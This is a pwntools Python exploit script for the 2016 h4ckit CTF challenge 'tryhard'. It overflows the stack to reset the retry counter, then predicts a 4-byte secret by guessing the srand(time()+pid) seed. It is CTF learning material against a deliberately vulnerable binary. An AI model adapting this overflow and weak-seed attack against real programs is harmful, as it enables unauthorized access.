# h4ckit-ctf-2016 tryhard
# strcmp between user input and a random 4-byte secret (generated everytime the binary is run)
# we can overwrite stack to change num_tries from 3 to a any number (e.g. to -1 to have "infinite" number of attempts)
# but we still can't bruteforce the 4-byte secret as that would take way too long.
# however we can see that the binary generates these 4 bytes with rand() after calling srand(time() + getpid())
# and the value returned by rand() is % 94 + 33 so that the value is a printable char

from pwn import *
from time import time

def rand_secret(seed):
    with process(('/tmp/tryhard_rand', str(seed))) as target:
        return target.recv(4)

def solve():
    now = int(time())
    pid = 0

    #with remote('ctf.com.ua', 9002) as target:
    #with remote('127.0.0.1', 9002) as target:
    with process('/opt/m/share/tryhard_1e6103f974bc61ef929e3791ec60e65e') as target:

        _ = target.recvuntil('Enter the passcode to get the flag: ')
        target.sendline('AAAABBBBCCCCDDDDEEEE\xff\xff\xff\xff')

        while True:
            seed = now + pid
            print('%d %d %d' % (seed, now, pid))
            secret = rand_secret(seed)

            try:
                resp = target.recvuntil('Enter the passcode to get the flag: ')
                print('%r' % resp)
            except EOFError:
                print('flag: %r' % target.clean())
                return
            
            print('sending %r' % secret)
            target.sendline(secret)

            pid += 1

if __name__ == '__main__':
    solve()
